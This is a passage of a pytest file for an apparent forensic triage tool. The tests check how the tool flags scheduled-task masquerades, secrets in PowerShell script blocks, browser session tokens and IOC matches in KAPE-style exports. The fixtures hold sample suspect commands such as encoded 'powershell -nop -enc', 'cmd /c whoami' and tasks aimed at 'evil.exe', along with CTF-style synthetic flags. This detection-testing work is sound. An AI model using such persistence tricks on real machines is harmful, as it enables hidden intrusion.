        for i in range(n)]))
    rep = K.scan([tmp_path])
    assert [e.metadata["data"]["ServiceName"] for e in rep.events] == [f"s{i}" for i in range(n)]


def test_the_4702_update_carries_its_task_xml_as_taskcontentnew(tmp_path):
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(1, "2031-03-04 10:00:00.0000000", 4702, "Security",
           {"TaskName": "\\Changed", "TaskContentNew": task_xml("new text", "C:\\x.exe")})]))
    rep = K.scan([tmp_path])
    task = rep.collections[0].tasks["\\changed"]
    assert task["comment"] == "new text" and task["task_to_run"] == "C:\\x.exe"
    assert task["registered_utc"] is None                   # an update is not a registration
    assert "TaskContentNew" not in rep.events[0].description


def test_a_task_is_highlighted_at_its_registration_and_inside_a_pivot_window(tmp_path):
    put(tmp_path, "h/Registry/r_RECmd_Batch_x_Output.csv", _mru("2031-03-04 12:00:00.0000000"))
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(1, "2031-03-04 09:00:00.0000000", 140, TS, {"TaskName": "\\Job", "UserName": "u"}),      # an update first
        ev(2, "2031-03-04 09:30:00.0000000", 106, TS, {"TaskName": "\\Job", "UserContext": "u"}),   # the registration
        ev(3, "2031-03-04 12:00:30.0000000", 140, TS, {"TaskName": "\\Job", "UserName": "u"}),      # after Win+R
        ev(4, "2031-03-04 15:00:00.0000000", 141, TS, {"TaskName": "\\Job", "UserName": "u"}),
        ev(5, "2031-03-04 12:00:31.0000000", 106, TS, {"TaskName": "\\Microsoft\\Windows\\X\\Y", "UserContext": "u"}),
        ev(6, "2031-03-04 16:00:00.0000000", 141, TS, {"TaskName": "\\Never Registered", "UserName": "u"}),
    ]))
    rep = K.scan([tmp_path])
    marks = {(e.metadata["record"]): (e.metadata.get("highlight"), e.metadata["tags"]) for e in rep.events
             if e.source.startswith("evtx:")}
    assert marks == {1: (None, ["task"]), 2: ("task", ["task"]), 3: ("task", ["task", "pivot"]), 4: (None, ["task"]),
                     5: (None, ["task-builtin"]),            # Windows' own task, even inside the window
                     6: ("task", ["task"])}                  # no registration event: its first event stands in
    assert rep.collections[0].tasks["\\job"]["registered_utc"] == "2031-03-04T09:30:00Z"
    assert rep.collections[0].tasks["\\never registered"]["registered_utc"] is None


def test_which_script_blocks_are_highlights(tmp_path):
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        block(1, "2031-03-04 10:00:00.0000000", "plain", 1, 1, "Get-ChildItem http://plain.example.test/"),
        block(2, "2031-03-04 10:00:01.0000000", "secret", 1, 1, "$token = 'abc'"),
        block(3, "2031-03-04 10:00:02.0000000", "named", 1, 1, "ping needle.example.test")]))
    rep = K.scan([tmp_path])                                # no RunMRU here, so no pivot window
    assert [e.metadata["script_block_id"] for e in rep.highlights()] == ["secret"]
    assert [b["after_run_mru"] for b in rep.collections[0].script_blocks] == [False, False, False]
    hit = K.scan([tmp_path], iocs=["needle.example.test"])
    assert [e.metadata["script_block_id"] for e in hit.highlights()] == ["named"]


def test_the_result_carries_at_most_five_lines_of_evidence_per_kind(tmp_path):
    put(tmp_path, "h/WebBrowsers/Hindsight_output.xlsx", hindsight([
        ["url", f"2031-03-05 08:00:0{i}.000", f"https://portal.example.test/a?token=v{i}", "t"] for i in range(8)]))
    rep = K.scan([tmp_path])
    assert len(rep.highlights()) == 8
    res = K.result_of(rep, _ff(), K.render(rep))
    # one parameter whose value changed eight times: the newest five values, listed in time order
    assert [e.detail.split("token=")[1].split(" ")[0] for e in res.evidence] == ["v3", "v4", "v5", "v6", "v7"]


def _mark_encrypted(data: bytes, member: str) -> bytes:
    """Set the 'encrypted' flag bit of one member in the local and the central header."""
    b, name = bytearray(data), member.encode()
    for sig, flag_at, name_at in ((b"PK\x03\x04", 6, 30), (b"PK\x01\x02", 8, 46)):
        at = b.find(sig)
        while at != -1:
            if bytes(b[at + name_at:at + name_at + len(name)]) == name:
                b[at + flag_at] |= 1
            at = b.find(sig, at + 4)
    return bytes(b)


def test_an_encrypted_zip_member_is_not_read_and_is_counted(tmp_path):
    base = host2(tmp_path / "src")
    locked = "LAB-PC-02/EventLogs/20310306100100_EvtxECmd_Output.csv"
    put(tmp_path, "h.zip", _mark_encrypted(_zip_tree(base), locked))
    rep = K.scan([tmp_path / "h.zip"])
    assert [e.source for e in rep.events] == ["recmd:RunMRU"]            # the registry export is still read
    assert any("h.zip" in n and "1 encrypted member(s) not read" in n for n in rep.notes)


def test_a_broken_zip_in_the_folder_is_named_and_the_rest_is_read(tmp_path):
    host2(tmp_path)
    put(tmp_path, "broken.zip", b"PK\x03\x04 not really")
    rep = K.scan([tmp_path])
    assert len(rep.collections) == 1 and len(rep.events) == 2
    assert any("broken.zip" in n and "not a readable zip" in n for n in rep.notes)


def test_a_console_log_that_is_not_kapes_does_not_name_the_host(tmp_path):
    base = tmp_path / "exports"
    put(base, "a_PECmd_Output_Timeline.csv", _csv(["RunTime", "ExecutableName"], [["2031-03-04 10:00:00", "A.EXE"]]))
    put(base, "tool_ConsoleLog.txt", b"Some other tool\r\nMachine name: WRONG-HOST, x\r\n")
    rep = K.scan([tmp_path])
    assert [(c.host, c.layout, c.machine) for c in rep.collections] == [("exports", "loose", None)]
    put(base, "tool_ConsoleLog.txt", b"KAPE directory: C:\\KAPE\r\nMachine name: RIGHT-HOST, x\r\n")
    rep = K.scan([tmp_path])
    assert [(c.host, c.layout, c.machine) for c in rep.collections] == [("RIGHT-HOST", "kape", "RIGHT-HOST")]


def test_a_folder_file_with_a_zip_members_name_but_another_size_is_not_its_copy(tmp_path):
    base = host1(tmp_path / "scratch" / "LAB-PC-01.zip.unpacked")
    put(tmp_path, "scratch/LAB-PC-01.zip", _zip_tree(base))
    put(base, "ProgramExecution/20310306090300_PECmd_Output_Timeline.csv", _csv(
        ["RunTime", "ExecutableName"], [["2031-03-04 10:00:08.0000000", "TOOL.EXE"], ["2031-03-03 07:00:00.0000000", "CHROME.EXE"],
                                        ["2031-03-02 07:00:00.0000000", "EXTRA.EXE"]]))
    rep = K.scan([tmp_path / "scratch"])
    # the zip is the complete copy of its own files (read in place); the differing file is read as well
    assert sorted(e.path for e in rep.events if e.source == "pecmd") == ["CHROME.EXE", "CHROME.EXE", "EXTRA.EXE",
                                                                         "TOOL.EXE", "TOOL.EXE"]
    assert len([e for e in rep.events if e.source == "recmd:RunMRU"]) == 1
    assert any("read in place, because only 4 of its 5 artifact file(s)" in n for n in rep.notes)


# ---------------------------------------------------------------- verification round 1

def test_a_task_registered_twice_keeps_its_earliest_registration(tmp_path):
    # the later registration comes first in the file, so keeping either the first-read or the latest fails
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(1, "2031-03-04 11:00:00.0000000", 106, TS, {"TaskName": "\\Twice", "UserContext": "u"}),
        ev(2, "2031-03-04 09:00:00.0000000", 106, TS, {"TaskName": "\\Twice", "UserContext": "u"}),
        ev(3, "2031-03-04 10:00:00.0000000", 4698, "Security",
           {"TaskName": "\\Twice", "TaskContent": task_xml("c", "C:\\x.exe")})]))
    rep = K.scan([tmp_path])
    assert rep.collections[0].tasks["\\twice"]["registered_utc"] == "2031-03-04T09:00:00Z"
    assert [e.metadata["record"] for e in rep.highlights()] == [2]       # highlighted at that registration


def _secret_blocks_then_a_pivot_block(root: Path) -> None:
    """Six blocks with a secret before a Win+R write, then one plain block inside its window."""
    put(root, "h/Registry/r_RECmd_Batch_x_Output.csv", _mru("2031-03-04 12:00:00.0000000"))
    put(root, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        block(i, f"2031-03-04 09:00:0{i}.0000000", f"old-{i}", 1, 1, f"$token = 'early{i}'") for i in range(6)]
        + [block(9, "2031-03-04 12:00:30.0000000", "after-run", 1, 1, "Get-ChildItem C:\\Users")]))


def test_a_script_block_inside_the_pivot_window_is_tagged_and_wins_an_evidence_slot(tmp_path):
    _secret_blocks_then_a_pivot_block(tmp_path)
    rep = K.scan([tmp_path])
    tags = {e.metadata["script_block_id"]: e.metadata["tags"] for e in rep.events if e.source.startswith("evtx:")}
    assert tags["after-run"] == ["scriptblock", "pivot"]
    assert all(tags[f"old-{i}"] == ["scriptblock"] for i in range(6))
    res = K.result_of(rep, _ff(), K.render(rep))
    blocks = [e.detail for e in res.evidence if " scriptblock: " in e.detail]
    assert len(blocks) == K.EVIDENCE_PER_KIND
    # the pivot block (no secret) takes a slot from the six earlier secret blocks; the newest two lose
    assert any("Get-ChildItem" in d for d in blocks)
    assert [d for d in blocks if "early4" in d or "early5" in d] == []


def test_a_script_block_with_a_secret_wins_over_a_plain_one_in_the_same_tier(tmp_path):
    put(tmp_path, "h/Registry/r_RECmd_Batch_x_Output.csv", _mru("2031-03-04 12:00:00.0000000"))
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        block(i, f"2031-03-04 12:00:0{i}.0000000", f"plain-{i}", 1, 1, f"Get-Item p{i}") for i in range(1, 7)]
        + [block(9, "2031-03-04 12:00:09.0000000", "late-secret", 1, 1, "$token = 'zz'")]))
    res = K.result_of(K.scan([tmp_path]), _ff(), "")
    blocks = [e.detail for e in res.evidence if " scriptblock: " in e.detail]
    assert any("$token 'zz'" in d for d in blocks) and not any("Get-Item p5" in d for d in blocks)


def test_evidence_puts_the_secret_the_comment_and_the_token_ahead_of_a_long_description(tmp_path):
    filler = "Write-Output 'noise'; " * 30
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        block(1, "2031-03-04 10:00:00.0000000", "long", 1, 1, filler + 'tool.exe --set-password "frag_secret"'),
        ev(2, "2031-03-04 10:00:01.0000000", 106, TS, {"TaskName": "\\Long Task", "UserContext": "U" * 300},
           desc="Scheduled Task created")]))
    put(tmp_path, "h/Persistence/Scheduled Tasks.csv", schtasks([
        {"TaskName": "\\Long Task", "Task To Run": "C:\\t\\run.exe", "Comment": "frag_comment"}]))
    put(tmp_path, "h/WebBrowsers/Hindsight_output.xlsx", hindsight([
        ["url", "2031-03-05 08:00:00.000", "https://portal.example.test/" + "a/" * 60 + "x?token=frag_token",
         "T" * 300]]))
    rep = K.scan([tmp_path])
    for e in rep.highlights():                 # the values are past the old 80/160 cuts of path and description
        assert all(v not in K._one(e.path, 80) + K._one(e.description, 160)
                   for v in ("frag_secret", "frag_comment", "frag_token"))
    res = K.result_of(rep, _ff(), K.render(rep))
    detail = {e.detail.split(" ")[2].rstrip(":"): e.detail for e in res.evidence}
    assert 'secret-like: --set-password "frag_secret" | ' in detail["scriptblock"]
    assert "task: comment: frag_comment; task_to_run: C:\\t\\run.exe | " in detail["task"]
    assert "browser-token: token=frag_token | " in detail["browser-token"]


def test_the_newest_value_of_each_token_parameter_wins_an_evidence_slot(tmp_path):
    rows = [["url", "2031-03-05 08:00:00.000", "https://a.example.test/p?token=a-old", "t"],
            ["url", "2031-03-05 08:00:05.000", "https://a.example.test/p?token=a-new", "t"]]
    rows += [["url", f"2031-03-05 09:00:0{i}.000", f"https://b.example.test/q?sid=b{i}", "t"] for i in range(6)]
    put(tmp_path, "h/WebBrowsers/Hindsight_output.xlsx", hindsight(rows))
    rep = K.scan([tmp_path])
    toks = {t["value"]: t.get("latest", False) for t in rep.collections[0].tokens}
    assert toks == {"a-old": False, "a-new": True, **{f"b{i}": i == 5 for i in range(6)}}
    latest = [e.path.rsplit("=", 1)[1] for e in rep.events if "token-latest" in e.metadata.get("tags", ())]
    assert latest == ["a-new", "b5"]
    res = K.result_of(rep, _ff(), "")
    got = [e.detail.split("browser-token: ")[1].split(" ")[0] for e in res.evidence]
    # a-new is older than every b value but is its parameter's newest; then the newest of the rest
    assert got == ["token=a-new", "sid=b2", "sid=b3", "sid=b4", "sid=b5"]


@pytest.mark.parametrize("name, command, want", [
    ("\\OneDrive Standalone Update Task-S-1-5-21-1-2-3-1001",
     "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe", ("OneDrive", "vendor")),
    ("\\OneDrive Startup Task-S-1-5-21-1-2-3-1001",
     "C:\\Users\\dana\\AppData\\Local\\Microsoft\\OneDrive\\26.1.0.7\\OneDriveLauncher.exe /startInstances",
     ("OneDrive", "vendor")),
    ("\\MicrosoftEdgeUpdateTaskMachineUA",
     "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe /ua", ("Microsoft Edge Update", "vendor")),
    ("\\GoogleSystem\\GoogleUpdater\\GoogleUpdaterTaskSystem157.0.8089.0{X}",
     'C:\\Program Files (x86)\\Google\\GoogleUpdater\\157.0.8089.0\\updater.exe" --wake --system"',
     ("Google Update", "vendor")),
    ("\\OneDrive Reporting Task-S-1-5-21-1-2-3-1001", "", ("OneDrive", "unverified")),
    ("\\MicrosoftEdgeUpdateTaskMachineCore",
     "powershell -nop -c C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
     ("Microsoft Edge Update", "masquerade")),
    ("\\OneDrive Standalone Update Task-S-1", "C:\\Temp\\OneDriveStandaloneUpdater.exe", ("OneDrive", "masquerade")),
    ("\\Updates\\OneDrive Standalone Update Task-S-1",
     "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe", (None, None)),   # name must lead
    ("\\Maintenance", "C:\\Program Files\\Google\\Update\\GoogleUpdate.exe", (None, None)),
], ids=["onedrive", "onedrive-versioned", "edge", "google", "name-only", "edge-powershell", "onedrive-temp",
        "other-folder", "other-name"])
def test_a_vendor_task_needs_its_name_and_its_program(name, command, want):
    assert K.vendor_of(name, command) == want


def test_vendor_updater_tasks_give_way_to_the_others(tmp_path):
    od = "\\OneDrive Standalone Update Task-S-1-5-21-1-2-3-1001"
    edge = "\\MicrosoftEdgeUpdateTaskMachineCore"
    put(tmp_path, "h/Persistence/Scheduled Tasks.csv", schtasks([
        {"TaskName": od, "Task To Run": "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe",
         "Author": "Microsoft Corporation"},
        {"TaskName": edge, "Task To Run": "cmd /c C:\\Temp\\e.bat", "Author": "Microsoft Corporation"}]))
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(1, "2031-03-04 08:00:00.0000000", 106, TS, {"TaskName": od, "UserContext": "u"}),
        ev(2, "2031-03-04 08:30:00.0000000", 106, TS, {"TaskName": edge, "UserContext": "u"})]
        + [ev(10 + i, f"2031-03-04 09:00:0{i}.0000000", 106, TS,
              {"TaskName": f"\\OneDrive Reporting Task-S-1-5-21-1-2-3-100{i}", "UserContext": "u"}) for i in range(5)]
        + [ev(20, "2031-03-04 23:00:00.0000000", 106, TS, {"TaskName": "\\Plain Job", "UserContext": "u"})]))
    rep = K.scan([tmp_path])
    tasks = rep.collections[0].tasks
    assert (tasks[od.casefold()]["vendor"], tasks[od.casefold()]["vendor_verdict"]) == ("OneDrive", "vendor")
    assert tasks[edge.casefold()]["vendor_verdict"] == "masquerade"
    marks = {e.metadata["record"]: (e.metadata.get("highlight"), e.metadata["tags"]) for e in rep.events}
    assert marks[1] == (None, ["task-vendor"]) and rep.events[0].metadata["vendor"] == "OneDrive"
    assert marks[2] == ("task", ["task", "masquerade"])
    assert all(marks[10 + i] == ("task", ["task", "vendor-unverified"]) for i in range(5))
    assert marks[20] == ("task", ["task"])
    res = K.result_of(rep, _ff(), K.render(rep))
    picked = [e.detail.split(" task: ")[1] for e in res.evidence if " task: " in e.detail]
    # seven highlighted tasks, five slots: the masquerade and the plain task first, then the earliest
    # three unverified vendor names; the confirmed OneDrive updater is not a highlight at all
    assert [p.split(" ")[0] for p in picked] == ["task_to_run:", "\\OneDrive", "\\OneDrive", "\\OneDrive", "\\Plain"]
    assert ["1000" in picked[1], "1001" in picked[2], "1002" in picked[3]] == [True, True, True]
    text = K.render(rep)
    assert "[OneDrive updater]" in text and "[MASQUERADE: Microsoft Edge Update task name, another program]" in text
    assert text.index("\\Plain Job") < text.index(od)        # confirmed vendor tasks are listed last


def test_a_masquerading_task_wins_an_evidence_slot_over_earlier_tasks(tmp_path):
    edge = "\\MicrosoftEdgeUpdateTaskMachineUA"
    put(tmp_path, "h/Persistence/Scheduled Tasks.csv", schtasks([
        {"TaskName": edge, "Task To Run": "C:\\Users\\Public\\e.exe"}]))
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(i, f"2031-03-04 09:00:0{i}.0000000", 106, TS, {"TaskName": f"\\Job {i}", "UserContext": "u"}) for i in range(6)]
        + [ev(9, "2031-03-04 23:30:00.0000000", 106, TS, {"TaskName": edge, "UserContext": "u"})]))
    res = K.result_of(K.scan([tmp_path]), _ff(), "")
    picked = [e.detail.split(" task: ")[1] for e in res.evidence if " task: " in e.detail]
    assert len(picked) == 5 and picked[-1].startswith("task_to_run: C:\\Users\\Public\\e.exe | " + edge)


def test_an_ioc_snippet_keeps_the_case_of_the_row(tmp_path):
    put(tmp_path, "h/ProgramExecution/x_PECmd_Output_Timeline.csv", _csv(["RunTime", "ExecutableName"], [
        ["2031-03-04 10:00:00.0000000", "Straße-Kit NeedleTok-AbC9xY.EXE"]]))
    rep = K.scan([tmp_path], iocs=["needletok-abc9xy"])
    (hit,) = rep.collections[0].ioc_hits
    assert hit["snippet"] == "2031-03-04 10:00:00.0000000 | Straße-Kit NeedleTok-AbC9xY.EXE"


@pytest.mark.parametrize("orig, ioc, want", [
    ("abNEEDLEcd", "needle", "NEEDLE"),
    ("ßßNEEDLEß", "needle", "NEEDLE"),            # 'ß' folds to two characters
    ("xßy", "ssy", "ßy"),                          # the match starts inside a folded character
    ("aSS", "ss", "SS"),
])
def test_the_original_span_of_a_casefolded_match(orig, ioc, want):
    folded = orig.casefold()
    start, end = K._orig_span(orig, folded, folded.find(ioc), len(ioc))
    assert orig[start:end] == want


# ---------------------------------------------------------------- verification round 2

EDGE = "\\MicrosoftEdgeUpdateTaskMachineCore"
EDGE_EXE = "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"


def task_xml_actions(description, commands) -> str:
    """A task XML with one Exec action per command, written the way EvtxECmd writes it."""
    acts = "".join(f"<Exec><Command>{c}</Command></Exec>" for c in commands)
    lines = ['<?xml version="1.0" encoding="UTF-16"?>',
             '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">',
             f"  <RegistrationInfo><Description>{description}</Description></RegistrationInfo>",
             f'  <Actions Context="Author">{acts}</Actions>', "</Task>"]
    return html.escape(", ".join(lines), quote=False)


def _task_marks(rep):
    return {e.metadata["record"]: (e.metadata.get("highlight"), e.metadata["tags"]) for e in rep.events
            if e.source.startswith("evtx:")}


def test_a_4702_that_points_a_vendor_task_at_another_program_is_a_masquerade(tmp_path):
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(1, "2031-03-04 08:00:00.0000000", 4698, "Security",
           {"TaskName": EDGE, "TaskContent": task_xml("Keeps Edge up to date", EDGE_EXE, "/c")}),
        ev(2, "2031-03-04 13:00:00.0000000", 4702, "Security",
           {"TaskName": EDGE, "TaskContentNew": task_xml("Keeps Edge up to date", "C:\\Users\\Public\\evil.exe")})]))
    rep = K.scan([tmp_path])
    task = rep.collections[0].tasks[EDGE.casefold()]
    assert task["vendor_verdict"] == "masquerade"
    assert task["task_to_run"] == "C:\\Users\\Public\\evil.exe"            # the newest command is shown
    assert task["other_commands"] == [EDGE_EXE + " /c"]
    assert _task_marks(rep) == {1: ("task", ["task", "masquerade"]),
                                2: ("task", ["task", "masquerade", "task-changed"])}
    res = K.result_of(rep, _ff(), K.render(rep))
    lines = [e.detail for e in res.evidence if " task: " in e.detail]
    assert len(lines) == 2 and all("task_to_run: C:\\Users\\Public\\evil.exe" in d for d in lines)
    text = K.render(rep)
    assert "      runs: C:\\Users\\Public\\evil.exe" in text and f"      also seen running: {EDGE_EXE} /c" in text


def test_a_second_schtasks_action_row_with_another_program_is_a_masquerade(tmp_path):
    put(tmp_path, "h/Persistence/Scheduled Tasks.csv", schtasks([
        {"TaskName": EDGE, "Task To Run": EDGE_EXE + " /c", "Comment": "Keeps Edge up to date"},
        {"TaskName": EDGE, "Task To Run": "C:\\Users\\Public\\evil.exe"}]))
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(1, "2031-03-04 08:00:00.0000000", 106, TS, {"TaskName": EDGE, "UserContext": "u"})]))
    rep = K.scan([tmp_path])
    task = rep.collections[0].tasks[EDGE.casefold()]
    assert task["vendor_verdict"] == "masquerade"
    assert task["task_to_run"] == EDGE_EXE + " /c" and task["other_commands"] == ["C:\\Users\\Public\\evil.exe"]
    assert [c["sources"] for c in task["commands"]] == [["schtasks"], ["schtasks"]]
    assert _task_marks(rep) == {1: ("task", ["task", "masquerade"])}
    res = K.result_of(rep, _ff(), "")
    (line,) = [e.detail for e in res.evidence if " task: " in e.detail]
    assert "other_commands: C:\\Users\\Public\\evil.exe" in line


def test_a_task_xml_with_a_second_exec_action_is_a_masquerade(tmp_path):
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(1, "2031-03-04 08:00:00.0000000", 4698, "Security",
           {"TaskName": EDGE, "TaskContent": task_xml_actions("d", [EDGE_EXE, "C:\\Temp\\two.exe"])})]))
    rep = K.scan([tmp_path])
    task = rep.collections[0].tasks[EDGE.casefold()]
    assert [c["command"] for c in task["commands"]] == [EDGE_EXE, "C:\\Temp\\two.exe"]
    assert task["vendor_verdict"] == "masquerade" and _task_marks(rep)[1][0] == "task"


def test_a_flag_in_a_tasks_other_command_is_named_by_its_task(tmp_path):
    put(tmp_path, "h/Persistence/Scheduled Tasks.csv", schtasks([
        {"TaskName": "\\Two Actions", "Task To Run": "C:\\one.exe"},
        {"TaskName": "\\Two Actions", "Task To Run": "C:\\two.exe CSCTF{synthetic_second_action}"}]))
    rep = K.scan([tmp_path])
    res = K.result_of(rep, _ff(), K.render(rep))
    assert res.flags == ("CSCTF{synthetic_second_action}",)
    assert "stands verbatim in h task \\Two Actions" in res.evidence[0].detail


def test_a_change_to_a_confirmed_vendor_task_is_still_highlighted(tmp_path):
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(1, "2031-03-04 08:00:00.0000000", 4698, "Security", {"TaskName": EDGE, "TaskContent": task_xml("d", EDGE_EXE)}),
        ev(2, "2031-03-04 09:00:00.0000000", 4702, "Security",
           {"TaskName": EDGE, "TaskContentNew": task_xml("d", EDGE_EXE, "/ua")}),
        ev(3, "2031-03-04 10:00:00.0000000", 140, TS, {"TaskName": EDGE, "UserName": "u"}),
        ev(4, "2031-03-04 11:00:00.0000000", 141, TS, {"TaskName": EDGE, "UserName": "u"})]))
    rep = K.scan([tmp_path])
    task = rep.collections[0].tasks[EDGE.casefold()]
    assert task["vendor_verdict"] == "vendor" and task["task_to_run"] == EDGE_EXE + " /ua"
    assert _task_marks(rep) == {1: (None, ["task-vendor"]), 2: ("task", ["task-changed", "task-vendor"]),
                                3: ("task", ["task-changed", "task-vendor"]), 4: (None, ["task-vendor"])}


def test_the_newest_task_xml_is_the_command_unless_schtasks_shows_the_current_one(tmp_path):
    rows = [ev(1, "2031-03-04 10:00:00.0000000", 4698, "Security",
               {"TaskName": "\\Job", "TaskContent": task_xml("d", "C:\\a.exe")}),
            ev(2, "2031-03-04 12:00:00.0000000", 4702, "Security",
               {"TaskName": "\\Job", "TaskContentNew": task_xml("d", "C:\\b.exe")}),
            ev(3, "2031-03-04 11:00:00.0000000", 4702, "Security",
               {"TaskName": "\\Job", "TaskContentNew": task_xml("d", "C:\\c.exe")})]
    put(tmp_path, "one/h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, rows))
    task = K.scan([tmp_path / "one"]).collections[0].tasks["\\job"]
    assert task["task_to_run"] == "C:\\b.exe"                    # not the first in the file, nor the last
    assert task["other_commands"] == ["C:\\a.exe", "C:\\c.exe"]
    put(tmp_path, "two/h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, rows))
    put(tmp_path, "two/h/Persistence/Scheduled Tasks.csv", schtasks([{"TaskName": "\\Job", "Task To Run": "C:\\d.exe"}]))
    task = K.scan([tmp_path / "two"]).collections[0].tasks["\\job"]
    assert task["task_to_run"] == "C:\\d.exe" and task["other_commands"] == ["C:\\a.exe", "C:\\b.exe", "C:\\c.exe"]


@pytest.mark.parametrize("command, want", [
    ("%windir%\\system32\\defrag.exe -c -h", None),
    ("%SystemRoot%\\System32\\wermgr.exe -upload", None),
    ("C:\\Windows\\SysWOW64\\x.exe", None),
    ('"C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe" /frequentupdate', None),
    ("C:\\Program Files (x86)\\Microsoft Office\\root\\x.exe /a", None),
    ("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.1-0\\MpCmdRun.exe -IdleTask", None),
    ("COM handler", None),
    ("sc.exe start w32time task_started", None),
    ("", None),
    ("C:\\Users\\Public\\m.exe", "outside"),
    ("C:\\ProgramData\\Updater\\m.exe /q", "outside"),
    ("%windir%\\explorer.exe", "outside"),
    ("C:\\Windows\\System32\\..\\..\\Users\\Public\\m.exe", "outside"),
    ("powershell.exe -nop -enc AAAA", "script host"),
    ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File x.ps1", "script host"),
    ("cmd /c whoami", "script host"),
])
def test_which_microsoft_task_commands_are_suspect(command, want):
    got = K.builtin_suspect(command)
    assert (got is None) if want is None else (want in got)


def test_a_task_under_microsoft_that_runs_a_payload_is_highlighted(tmp_path):
    hidden = "\\Microsoft\\Windows\\Maintenance\\CacheSync"
    put(tmp_path, "h/Persistence/Scheduled Tasks.csv", schtasks([
        {"TaskName": hidden, "Task To Run": "C:\\Users\\Public\\cache.exe", "Comment": "frag_hidden"},
        {"TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", "Task To Run": "%windir%\\system32\\defrag.exe -c"}]))
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(1, "2031-03-04 08:00:00.0000000", 106, TS, {"TaskName": hidden, "UserContext": "u"}),
        ev(2, "2031-03-04 08:30:00.0000000", 106, TS,
           {"TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", "UserContext": "u"}),
        ev(3, "2031-03-04 09:00:00.0000000", 4698, "Security",
           {"TaskName": "\\Microsoft\\Windows\\PowerShell\\ScheduledJobs\\J",
            "TaskContent": task_xml("d", "powershell.exe", "-enc AAAA")})]))
    rep = K.scan([tmp_path])
    tasks = rep.collections[0].tasks
    assert "outside system32" in tasks[hidden.casefold()]["suspect"]
    assert "suspect" not in tasks["\\microsoft\\windows\\defrag\\scheduleddefrag"]
    assert _task_marks(rep) == {1: ("task", ["task", "masquerade"]), 2: (None, ["task-builtin"]),
                                3: ("task", ["task", "masquerade"])}
    res = K.result_of(rep, _ff(), "")
    lines = [e.detail for e in res.evidence if " task: " in e.detail]
    assert len(lines) == 2 and "comment: frag_hidden; task_to_run: C:\\Users\\Public\\cache.exe | " in lines[0]
    text = K.render(rep)
    assert "  scheduled tasks outside \\Microsoft\\: 0 of 3, and 2 in \\Microsoft\\ that Windows does not run" in text
    assert "MASQUERADE: in \\Microsoft\\, runs a script host" in text and "ScheduledDefrag  registered" not in text


def test_the_newest_value_of_each_of_two_parameters_on_one_url_is_latest(tmp_path):
    put(tmp_path, "h/WebBrowsers/Hindsight_output.xlsx", hindsight([
        ["url", "2031-03-05 08:00:00.000", "https://a.example.test/p?sid=s1&auth=a1", "t"],
        ["url", "2031-03-05 08:00:01.000", "https://a.example.test/p?sid=s2&auth=a1", "t"],
        ["url", "2031-03-05 08:00:02.000", "https://a.example.test/p?sid=s2&auth=a2", "t"]]))
    rep = K.scan([tmp_path])
    toks = {(t["param"], t["value"]): t.get("latest", False) for t in rep.collections[0].tokens}
    assert toks == {("sid", "s1"): False, ("auth", "a1"): False, ("sid", "s2"): True, ("auth", "a2"): True}


def test_every_secret_of_a_script_block_leads_its_evidence_line(tmp_path):
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        block(1, "2031-03-04 10:00:00.0000000", "three", 1, 1,
              "$password = 'frag_p1'\n$token = 'frag_t2'\n$apikey = 'frag_k3'\n" + "Write-Output 'noise'; " * 30)]))
    res = K.result_of(K.scan([tmp_path]), _ff(), "")
    (line,) = [e.detail for e in res.evidence if " scriptblock: " in e.detail]
    lead = line.split(" | ", 1)[0]
    assert all(v in lead for v in ("frag_p1", "frag_t2", "frag_k3"))
